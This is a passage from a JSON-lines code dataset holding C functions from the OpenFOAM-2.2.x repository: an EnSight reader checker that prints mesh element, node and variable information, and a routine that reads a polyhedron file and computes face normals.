Pbuild[p].ne[et];\n\n        if(ne > 0) {\n\n          pdata = (int *)calloc(ne*Elem_info[et].con_len,sizeof(int));\n          if(pdata == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating conns array\\n\");\n            return(Z_ERR);\n          }\n          else {\n            conns = (int **) calloc(ne,sizeof(int *));\n            if(conns == (int **) NULL) {\n              fprintf(stderr,\"Error: allocating conns array\\n\");\n              return(Z_ERR);\n            }\n            for(i=0; i<ne; ++i) {\n              conns[i] = pdata;\n              pdata += Elem_info[et].con_len;\n            }\n          }\n\n\n          /* Get the elements\n           *-----------------*/\n          err = USERD_get_part_elements_by_type(pn,et,conns);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting element connectivities\\n\");\n            return(Z_ERR);\n          }\n\n          if(Element_labels) {\n            elemids = (int *) calloc(ne,sizeof(int));\n            if(elemids == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating elemids array\\n\");\n              return(Z_ERR);\n            }\n          }\n\n          /* Get the element ids - if any\n           *-----------------------------*/\n          if(Element_labels) {\n            err = USERD_get_part_element_ids_by_type(pn,et,elemids);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting element ids\\n\");\n              return(Z_ERR);\n            }\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n\n#if (defined GT_USERD_API_202)\n\n          maxcheck = Z_NSIDED;\n\n          /* Nsided elements, if any\n           *------------------------*/\n          if(et == Z_NSIDED ||\n             et == Z_G_NSIDED) {\n\n            nsid_len = 0;\n            for(i=0; i<ne; ++i) {\n              nsid_len += conns[i][0];\n            }\n\n            nsid_con = (int *) calloc(nsid_len,sizeof(int));\n            if(nsid_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nsided conn array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nsided_conn(pn,nsid_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nsided conn array\\n\");\n              return(Z_ERR);\n            }\n\n            /* First element of the type\n             *--------------------------*/\n            i = 0;\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            if(Element_labels) {\n              fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n            }\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<conns[i][0]; ++j) {\n              fprintf(stderr,\" %d\",nsid_con[j]);\n            }\n            fprintf(stderr,\"\\n\");\n\n            /* Last element of the type\n             *-------------------------*/\n            i = ne - 1;\n            if(i > 0) {\n              fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n              if(Element_labels) {\n                fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n              }\n              fprintf(stderr,\"      connectivity:\");\n\n              for(j=nsid_len-conns[i][0]; j<nsid_len; ++j) {\n                fprintf(stderr,\" %d\",nsid_con[j]);\n              }\n              fprintf(stderr,\"\\n\");\n            }\n          }\n\n          /* Nfaced elements if any\n           *-----------------------*/\n          if(et == Z_NFACED ||\n             et == Z_G_NFACED) {\n\n            nface_len = 0;\n            for(i=0; i<ne; ++i) {\n              nface_len += conns[i][0];\n            }\n\n            nface_con = (int *) calloc(nface_len,sizeof(int));\n            if(nface_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nfaced face array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nfaced_nodes_per_face(pn,nface_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nfaced face array array\\n\");\n              return(Z_ERR);\n            }\n\n            npf_len = 0;\n            for(i=0; i<nface_len; ++i) {\n              npf_len += nface_con[i];\n            }\n\n            npf_con = (int *) calloc(npf_len,sizeof(int));\n            if(npf_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nfaced npf array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nfaced_conn(pn,npf_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nfaced conn array\\n\");\n              return(Z_ERR);\n            }\n\n            /* First element of the type\n             *--------------------------*/\n            jj = 0;\n            kk = 0;\n            for(i=0; i<ne; ++i) {\n\n              if(i == 0 ||\n                 i == ne-1) {\n                fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,\n                        i+1,ne);\n                if(Element_labels) {\n                  fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n                }\n                for(j=0; j<conns[i][0]; ++j) {\n                  fprintf(stderr,\"      face %d connectivity:\",j+1);\n                  for(k=0; k<nface_con[jj]; ++k) {\n                    fprintf(stderr,\" %d\",npf_con[kk]);\n                    ++kk;\n                  }\n                  fprintf(stderr,\"\\n\");\n                  ++jj;\n                }\n              }\n              else {\n                for(j=0; j<conns[i][0]; ++j) {\n                  for(k=0; k<nface_con[jj]; ++k) {\n                    ++kk;\n                  }\n                  ++jj;\n                }\n              }\n            }\n          }\n#else\n\n          maxcheck = Z_MAXTYPE;\n\n#endif\n\n          /* Regular elements\n           *-----------------*/\n          if(et < maxcheck) {\n\n            /* First element of the type\n             *--------------------------*/\n            i = 0;\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            if(Element_labels) {\n              fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n            }\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<Elem_info[et].con_len; ++j) {\n              fprintf(stderr,\" %d\",conns[i][j]);\n            }\n            fprintf(stderr,\"\\n\");\n\n            /* check the connectivity for negative numbers\n             * -------------------------------------------*/\n#if defined GT_USERD_API_100\n            for (i=0;i<ne;i++){\n              for(j=0; j<Elem_info[et].con_len; ++j) {\n                /* ---------- uncomment to print out connectivity values ---------- */\n/*              fprintf(stderr,\" %d\",conns[i][j]);  */\n                if (conns[i][j] <= 0 || conns[i][j] > Pbuild[p].nn ) {\n                  fprintf(stderr,\"\\n****************************\\n\");\n                  fprintf(stderr,\"Connectivity value out of bounds: \\n\");\n                  fprintf(stderr,\"Either less than zero or greater than \\n\");\n                  fprintf(stderr,\"  number of nodes in part!!  \\n\");\n                  fprintf(stderr,\"i = %d   j = %d  conns[i][j] = %d \\n\",i,j,conns[i][j]);\n                  fprintf(stderr,\"****************************\\n\");\n                }\n              }\n                /* ---------- uncomment to print out connectivity values ---------- */\n/*            fprintf(stderr,\"\\n\"); */\n            }\n#endif\n            /* Last element of the type\n             *-------------------------*/\n            i = ne - 1;\n            if(i > 0) {\n              fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n              if(Element_labels) {\n                fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n              }\n              fprintf(stderr,\"      connectivity:\");\n              for(j=0; j<Elem_info[et].con_len; ++j) {\n                fprintf(stderr,\" %d\",conns[i][j]);\n              }\n              fprintf(stderr,\"\\n\");\n            }\n          }\n\n          /* Free the allocated memory\n           *--------------------------*/\n          if(NULL != conns) {\n            if(NULL != *conns) {\n              free(*conns);\n              *conns = NULL;\n            }\n            free(conns);\n            conns = NULL;\n          }\n\n          if(Element_labels) {\n            free(elemids);\n          }\n        }\n      }\n\n      /* Get the coords\n       *---------------*/\n      nn = Pbuild[p].nn;\n\n      if(nn > 0) {\n\n        coords = (float **) calloc(3,sizeof(float *));\n        if(coords == (float **) NULL) {\n          fprintf(stderr,\"Error: allocating coords array\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(i=0; i<3; ++i) {\n            coords[i] = (float *) calloc((nn+1),sizeof(float));\n            if(coords[i] == (float *) NULL) {\n              fprintf(stderr,\"Error: allocating coords array\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n\n        if(Node_labels) {\n          nodeids = (int *) calloc((nn+1),sizeof(int));\n          if(nodeids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating nodeids array\\n\");\n            return(Z_ERR);\n          }\n        }\n\n\n        err = USERD_get_part_coords(pn,coords);\n        if(err == Z_ERR) {\n          fprintf(stderr,\"Error: getting unstructured coords\\n\");\n          return(Z_ERR);\n        }\n\n        if(Node_labels) {\n          err = USERD_get_part_node_ids(pn,nodeids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting nodeids\\n\");\n            return(Z_ERR);\n          }\n        }\n\n        /* Echo \"some\" info\n         *-----------------*/\n\n        /* First node\n         *-----------*/\n        i = 1;\n        fprintf(stderr,\"   Node %d of %d:\\n\",i,nn);\n        if(Node_labels) {\n          fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n        }\n        fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                coords[0][i], coords[1][i], coords[2][i]);\n        mm[0] = mm[1] = coords[0][i];\n        mm[2] = mm[3] = coords[1][i];\n        mm[4] = mm[5] = coords[2][i];\n\n\n        /* Last node\n         *----------*/\n        i = nn;\n        if(i > 1) {\n          fprintf(stderr,\"   Node %d of %d:\\n\",i,nn);\n          if(Node_labels) {\n            fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n          }\n          fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                  coords[0][i], coords[1][i], coords[2][i]);\n        }\n\n        /* Min and max coordinate values\n         *------------------------------*/\n        for(i=2; i<=nn; ++i) {\n          if(coords[0][i] < mm[0]) {\n            mm[0] = coords[0][i];\n          }\n          if(coords[0][i] > mm[1]) {\n            mm[1] = coords[0][i];\n          }\n          if(coords[1][i] < mm[2]) {\n            mm[2] = coords[1][i];\n          }\n          if(coords[1][i] > mm[3]) {\n            mm[3] = coords[1][i];\n          }\n          if(coords[2][i] < mm[4]) {\n            mm[4] = coords[2][i];\n          }\n          if(coords[2][i] > mm[5]) {\n            mm[5] = coords[2][i];\n          }\n        }\n\n        fprintf(stderr,\"   Coordinate ranges:\\n\");\n        fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n        fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n        fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n        fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n        fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n        fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n\n\n        /* Free the allocated memory\n         *--------------------------*/\n        for(i=0; i<3; ++i) {\n          free(coords[i]);\n        }\n        free(coords);\n        if(Node_labels) {\n          free(nodeids);\n        }\n      }\n    }\n\n\n    /*---------------------\n     * For structured parts\n     *---------------------*/\n    else {\n\n      empty_part = FALSE;\n      if(Pbuild[p].ne[0] == 0 &&\n         Pbuild[p].ne[1] == 0 &&\n         Pbuild[p].ne[2] == 0) {\n        empty_part = TRUE;\n      }\n\n      if(!empty_part) {\n\n        /* Get the block coords\n         *---------------------*/\n        for(comp=0; comp<3; ++comp) {\n          if(Pbuild[p].ne[comp] < 1) {\n            bdim[comp] = 1;\n          }\n          else {\n            bdim[comp] = Pbuild[p].ne[comp];\n          }\n        }\n        nn = bdim[0] * bdim[1] * bdim[2];\n\n        bd1 = bdim[0]-1;\n        if(bd1 < 1) {\n          bd1 = 1;\n        }\n        bd2 = bdim[1]-1;\n        if(bd2 < 1) {\n          bd2 = 1;\n        }\n        bd3 = bdim[2]-1;\n        if(bd3 < 1) {\n          bd3 = 1;\n        }\n        ne = bd1 * bd2 * bd3;\n\n        /* Determine cell type\n         *--------------------*/\n        num_dims = 3;\n        for(i=0; i<3; ++i) {\n          if(bdim[i] == 1) {\n            --num_dims;\n          }\n        }\n        if(num_dims == 3) {\n          cell_type = Z_HEX08;\n        }\n        else if(num_dims == 2) {\n          cell_type = Z_QUA04;\n        }\n        else {\n          cell_type = Z_BAR02;\n        }\n\n        coords = (float **) calloc(num_dims,sizeof(float *));\n        if(coords == (float **) NULL) {\n          fprintf(stderr,\"Error: allocating coords array\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(i=0; i<num_dims; ++i) {\n            coords[i] = (float *) calloc(nn,sizeof(float));\n            if(coords[i] == (float *) NULL) {\n              fprintf(stderr,\"Error: allocating coords array\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n\n        /* Get the coords\n         *---------------*/\n        for(comp=0; comp<num_dims; ++comp) {\n          err = USERD_get_block_coords_by_component(pn,comp,coords[comp]);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block coords\\n\");\n            return(Z_ERR);\n          }\n        }\n\n\n#if (defined GT_USERD_API_200)\n\n        if(Node_labels) {\n          nodeids = (int *) calloc(nn,sizeof(int));\n          if(nodeids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating nodeids array\\n\");\n            return(Z_ERR);\n          }\n        }\n        /* Get the node ids - if any\n         *--------------------------*/\n        if(Node_labels) {\n          err = USERD_get_part_node_ids(pn,nodeids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting nodeids\\n\");\n            return(Z_ERR);\n          }\n        }\n#endif\n\n        /* Echo \"some\" info\n         *-----------------*/\n\n        /* First node\n         *-----------*/\n        if(nn > 0) {\n          i = 0;\n          fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n#if (defined GT_USERD_API_200)\n\n          if(Node_labels) {\n            fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n          }\n#endif\n          if(num_dims == 3) {\n            fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                    coords[0][i], coords[1][i], coords[2][i]);\n            mm[0] = mm[1] = coords[0][i];\n            mm[2] = mm[3] = coords[1][i];\n            mm[4] = mm[5] = coords[2][i];\n          }\n          else if(num_dims == 2) {\n            fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                    coords[0][i], coords[1][i]);\n            mm[0] = mm[1] = coords[0][i];\n            mm[2] = mm[3] = coords[1][i];\n          }\n          else {\n            fprintf(stderr,\"      x coordinates: %g\\n\",\n                    coords[0][i]);\n            mm[0] = mm[1] = coords[0][i];\n          }\n\n\n          /* Last node\n           *----------*/\n          i = nn-1;\n          if(i > 1) {\n            fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n#if (defined GT_USERD_API_200)\n            if(Node_labels) {\n              fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n            }\n#endif\n            if(num_dims == 3) {\n              fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                      coords[0][i], coords[1][i], coords[2][i]);\n            }\n            else if(num_dims == 2) {\n              fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                      coords[0][i], coords[1][i]);\n            }\n            else {\n              fprintf(stderr,\"      x coordinates: %g\\n\",\n                      coords[0][i]);\n            }\n          }\n        }\n\n        /* Min and max coordinate values\n         *------------------------------*/\n        for(i=1; i<nn; ++i) {\n          if(coords[0][i] < mm[0]) {\n            mm[0] = coords[0][i];\n          }\n          if(coords[0][i] > mm[1]) {\n            mm[1] = coords[0][i];\n          }\n          if(num_dims > 1) {\n            if(coords[1][i] < mm[2]) {\n              mm[2] = coords[1][i];\n            }\n            if(coords[1][i] > mm[3]) {\n              mm[3] = coords[1][i];\n            }\n          }\n          if(num_dims > 2) {\n            if(coords[2][i] < mm[4]) {\n              mm[4] = coords[2][i];\n            }\n            if(coords[2][i] > mm[5]) {\n              mm[5] = coords[2][i];\n            }\n          }\n        }\n\n        fprintf(stderr,\"   Coordinate ranges:\\n\");\n        fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n        fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n        if(num_dims > 1) {\n          fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n          fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n        }\n        if(num_dims > 2) {\n          fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n          fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n        }\n\n        /* Free the allocated memory - so far\n         *-----------------------------------*/\n        for(i=0; i<num_dims; ++i) {\n          free(coords[i]);\n        }\n        free(coords);\n\n#if (defined GT_USERD_API_200)\n        if(Node_labels) {\n          free(nodeids);\n        }\n#endif\n\n        /* Get the block iblanking - if any\n         *---------------------------------*/\n        if(Pbuild[p].type == Z_IBLANKED) {\n\n          iblanking = (int *) calloc(nn,sizeof(int));\n          if(iblanking == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating iblanking array\\n\");\n            return(Z_ERR);\n          }\n\n          err = USERD_get_block_iblanking(pn,iblanking);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block iblanking\\n\");\n            return(Z_ERR);\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n          ib[Z_EXT]    = 0;\n          ib[Z_INT]    = 0;\n          ib[Z_BND]    = 0;\n          ib[Z_INTBND] = 0;\n          ib[Z_SYM]    = 0;\n\n          for(i=0; i<nn; ++i) {\n            ++ib[iblanking[i]];\n          }\n\n          fprintf(stderr,\"   Iblanking breakdown:\\n\");\n          fprintf(stderr,\"      Number of Z_EXT:    %d\\n\",ib[Z_EXT]);\n          fprintf(stderr,\"      Number of Z_INT:    %d\\n\",ib[Z_INT]);\n          fprintf(stderr,\"      Number of Z_BND:    %d\\n\",ib[Z_BND]);\n          fprintf(stderr,\"      Number of Z_INTBND: %d\\n\",ib[Z_INTBND]);\n          fprintf(stderr,\"      Number of Z_SYM:    %d\\n\",ib[Z_SYM]);\n\n          free(iblanking);\n        }\n\n#if (defined GT_USERD_API_200)\n\n        /* Get the ghost flags - if any\n         *-----------------------------*/\n        if(Pbuild[p].ghosts) {\n\n          ghost_flag = (int *) calloc(ne,sizeof(int));\n          if(ghost_flag == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating ghost_flag array\\n\");\n            return(Z_ERR);\n          }\n\n          err = USERD_get_block_ghost_flags(pn,ghost_flag);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block ghost flags\\n\");\n            return(Z_ERR);\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n          num_ghosts = 0;\n\n          for(i=0; i<ne; ++i) {\n            if(ghost_flag[i] > 0) {\n              ++num_ghosts;\n            }\n          }\n\n          fprintf(stderr,\"   Block Ghost flag breakdown:\\n\");\n          fprintf(stderr,\"      %d ghost cells out of %d total cells\\n\",\n                  num_ghosts,ne);\n\n          free(ghost_flag);\n        }\n\n        /* Get the element ids - if any\n         *-----------------------------*/\n        if(Element_labels) {\n\n          elemids = (int *) calloc(ne,sizeof(int));\n          if(elemids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating elemids array\\n\");\n            return(Z_ERR);\n          }\n\n\n          et = cell_type;\n          err = USERD_get_part_element_ids_by_type(pn,et,elemids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting element ids\\n\");\n            return(Z_ERR);\n          }\n\n          /* First element of the type\n           *--------------------------*/\n          i = 0;\n          fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n          fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n\n          /* Last element of the type\n           *-------------------------*/\n          i = ne - 1;\n          if(i > 0) {\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n          }\n\n          free(elemids);\n        }\n#endif\n      }\n      else {\n        fprintf(stderr,\"   Empty structured part\\n\");\n      }\n    }\n\n    /* Get border availability\n     *------------------------*/\n    err = USERD_get_border_availability(pn,num_elems);\n    if(err == Z_OK) {\n\n      /* Get border elements - if any\n       *-----------------------------*/\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = num_elems[et];\n        if(ne > 0) {\n\n          conns = (int **) calloc(ne,sizeof(int *));\n          if(conns == (int **) NULL) {\n            fprintf(stderr,\"Error: allocating border conns array\\n\");\n            return(Z_ERR);\n          }\n          else {\n            for(i=0; i<ne; ++i) {\n              conns[i] = (int *) calloc(Elem_info[et].con_len,sizeof(int));\n              if(conns[i] == (int *) NULL) {\n                fprintf(stderr,\"Error: allocating border conns array\\n\");\n                return(Z_ERR);\n              }\n            }\n          }\n\n          parent_type = (short *) calloc(ne,sizeof(short));\n          if(parent_type == (short *) NULL) {\n            fprintf(stderr,\"Error: allocating border parent_type array\\n\");\n            return(Z_ERR);\n          }\n\n          parent_num = (int *) calloc(ne,sizeof(int));\n          if(parent_num == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating border parent_num array\\n\");\n            return(Z_ERR);\n          }\n\n\n          err = USERD_get_border_elements_by_type(pn,\n                                                  et,\n                                                  conns,\n                                                  parent_type,\n                                                  parent_num);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting border elements\\n\");\n            return(Z_ERR);\n          }\n\n\n          /* Echo \"some\" info\n           *-----------------*/\n\n          /* First element of the type\n           *--------------------------*/\n          i = 0;\n          fprintf(stderr,\"   %s border element %d of %d:\\n\",\n                  Elem_info[et].name,i+1,ne);\n          fprintf(stderr,\"      Parent type: %s\\n\",\n                  Elem_info[parent_type[i]].name);\n          fprintf(stderr,\"      Parent num:  %d\\n\",parent_num[i]);\n          fprintf(stderr,\"      connectivity:\");\n          for(j=0; j<Elem_info[et].con_len; ++j) {\n            fprintf(stderr,\" %d\",conns[i][j]);\n          }\n          fprintf(stderr,\"\\n\");\n\n          /* Last element of the type\n           *-------------------------*/\n          i = ne - 1;\n          if(i > 0) {\n            fprintf(stderr,\"   %s border element %d of %d:\\n\",\n                    Elem_info[et].name,i+1,ne);\n            fprintf(stderr,\"      Parent type: %s\\n\",\n                    Elem_info[parent_type[i]].name);\n            fprintf(stderr,\"      Parent num:  %d\\n\",parent_num[i]);\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<Elem_info[et].con_len; ++j) {\n              fprintf(stderr,\" %d\",conns[i][j]);\n            }\n            fprintf(stderr,\"\\n\");\n          }\n\n\n          /* Free the allocated memory\n           *--------------------------*/\n          for(i=0; i<ne; ++i) {\n            free(conns[i]);\n          }\n          free(conns);\n          free(parent_type);\n          free(parent_num);\n        }\n      }\n    }\n  } /* end for p = 0 to Num_parts */\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*\n   ============================================================================\n   read in a polyhedron\n   ============================================================================\n*/\n", "func_signal": "void readPolyhedron(char *name, POLYHEDRON *p)", "code": "{\n  FILE *fp;\n  char line[200], *c;\n  int i, j, n;\n  double dx1, dy1, dz1, dx2, dy2, dz2, nx, ny, nz, len;\n  FACE *f;\n\n  \n  if (!(fp = fopen(name, \"r\"))) {\n    printf(\"i/o error\\n\");\n    exit(1);\n  }\n  \n  fscanf(fp, \"%d\", &p->numVerts);\n  printf(\"Reading in %d vertices\\n\", p->numVerts);\n  for (i = 0; i < p->numVerts; i++)\n    fscanf(fp, \"%lf %lf %lf\", \n\t   &p->verts[i][X], &p->verts[i][Y], &p->verts[i][Z]);\n\n  fscanf(fp, \"%d\", &p->numFaces);\n  printf(\"Reading in %d faces\\n\", p->numFaces);\n  for (i = 0; i < p->numFaces; i++) {\n    f = &p->faces[i];\n    f->poly = p;\n    fscanf(fp, \"%d\", &f->numVerts);\n    for (j = 0; j < f->numVerts; j++) fscanf(fp, \"%d\", &f->verts[j]);\n\n    /* compute face normal and offset w from first 3 vertices */\n    dx1 = p->verts[f->verts[1]][X] - p->verts[f->verts[0]][X];\n    dy1 = p->verts[f->verts[1]][Y] - p->verts[f->verts[0]][Y];\n    dz1 = p->verts[f->verts[1]][Z] - p->verts[f->verts[0]][Z];\n    dx2 = p->verts[f->verts[2]][X] - p->verts[f->verts[1]][X];\n    dy2 = p->verts[f->verts[2]][Y] - p->verts[f->verts[1]][Y];\n    dz2 = p->verts[f->verts[2]][Z] - p->verts[f->verts[1]][Z];\n    nx = dy1 * dz2 - dy2 * dz1;\n    ny = dz1 * dx2 - dz2 * dx1;\n    nz = dx1 * dy2 - dx2 * dy1;\n    len = sqrt(nx * nx + ny * ny + nz * nz);\n    f->norm[X] = nx / len;\n    f->norm[Y] = ny / len;\n    f->norm[Z] = nz / len;\n    f->w = - f->norm[X] * p->verts[f->verts[0]][X]\n           - f->norm[Y] * p->verts[f->verts[0]][Y]\n           - f->norm[Z] * p->verts[f->verts[0]][Z];\n\n  }\n\n  fclose(fp);\n\n}", "path": "src\\meshTools\\momentOfInertia\\volumeIntegration\\volInt.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * variable_info\n *--------------*/\n", "func_signal": "static int\nvariable_info( void )", "code": "{\n  int i,j;\n  int err;\n\n  char **var_description;\n  char **var_filename;\n  int *var_type;\n  int *var_classify;\n  int *var_complex;\n  char **var_ifilename;\n  float *var_freq;\n  int *var_contran;\n  int *var_timeset;\n\n\n  fprintf(stderr,\"\\n------------ variable_info --------------\\n\");\n\n  /* Get the number of variables\n   *----------------------------*/\n  Num_vars = USERD_get_number_of_variables();\n  if(Num_vars < 0) {\n    fprintf(stderr,\"Error: getting the number of variables\\n\");\n  }\n  else {\n    fprintf(stderr,\" Number of variables: %d\\n\",Num_vars);\n  }\n\n\n  /* Get the gold variable info\n   *---------------------------*/\n  Varinfo = (VARINFO *) calloc(Num_vars,sizeof(VARINFO));\n  if(Varinfo == (VARINFO *)NULL) {\n    fprintf(stderr,\" Problems allocating for Varinfo structure\\n\");\n    return(Z_ERR);\n  }\n\n\n  var_description = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_description == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var description\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_description[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_description[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var description\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_filename = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_filename == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var filename\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_filename[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_filename[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var filename\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_type = (int *) calloc(Num_vars,sizeof(int));\n  if(var_type == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var type\\n\");\n    return(Z_ERR);\n  }\n\n  var_classify = (int *) calloc(Num_vars,sizeof(int));\n  if(var_classify == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var classify\\n\");\n    return(Z_ERR);\n  }\n\n  var_complex = (int *) calloc(Num_vars,sizeof(int));\n  if(var_complex == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var complex\\n\");\n    return(Z_ERR);\n  }\n\n\n  var_ifilename = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_ifilename == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var ifilename\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_ifilename[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_ifilename[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var ifilename\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_freq = (float *) calloc(Num_vars,sizeof(float));\n  if(var_freq == (float *)NULL) {\n    fprintf(stderr,\" Problems allocating for var freq\\n\");\n    return(Z_ERR);\n  }\n\n  var_contran = (int *) calloc(Num_vars,sizeof(int));\n  if(var_contran == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var contran\\n\");\n    return(Z_ERR);\n  }\n\n  var_timeset = (int *) calloc(Num_vars,sizeof(int));\n  if(var_timeset == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var timeset\\n\");\n    return(Z_ERR);\n  }\n\n#if (defined GT_USERD_API_100)\n\n  err = USERD_get_gold_variable_info(var_description,\n                                     var_filename,\n                                     var_type,\n                                     var_classify,\n                                     var_complex,\n                                     var_ifilename,\n                                     var_freq,\n                                     var_contran,\n                                     var_timeset);\n#else\n\n  err = USERD_get_variable_info(var_description,\n                                var_filename,\n                                var_type,\n                                var_classify);\n\n#endif\n\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: getting variable info\\n\");\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n\n      /* Loading the global\n       * (for use in other routines)\n       *----------------------------*/\n      strncpy(Varinfo[i].description,var_description[i],Z_BUFL);\n      strncpy(Varinfo[i].filename,var_filename[i],Z_BUFL);\n      strncpy(Varinfo[i].ifilename,var_ifilename[i],Z_BUFL);\n      Varinfo[i].type     = var_type[i];\n      Varinfo[i].classify = var_classify[i];\n      Varinfo[i].complex  = var_complex[i];\n      Varinfo[i].freq     = var_freq[i];\n      Varinfo[i].contran  = var_contran[i];\n      Varinfo[i].timeset  = var_timeset[i];\n\n      /* Echo some feedback\n       *-------------------*/\n      fprintf(stderr,\" For Variable %d:\\n\",i+1);\n\n      fprintf(stderr,\"   var desc:      %s\\n\",var_description[i]);\n      fprintf(stderr,\"   var filename:  %s\\n\",var_filename[i]);\n\n#if (defined GT_USERD_API_100)\n      if(var_complex[i]) {\n        fprintf(stderr,\"   var complex:   TRUE\\n\");\n        fprintf(stderr,\"   var ifilename: %s\\n\",var_ifilename[i]);\n        fprintf(stderr,\"   var freq:      %g\\n\",var_freq[i]);\n      }\n      else {\n        fprintf(stderr,\"   var complex:   FALSE\\n\");\n      }\n#endif\n\n      if(var_type[i] == Z_CONSTANT) {\n        fprintf(stderr,\"   var type:      Z_CONSTANT\\n\");\n\n#if (defined GT_USERD_API_100)\n        if(var_contran[i]) {\n          fprintf(stderr,\"   var contran:  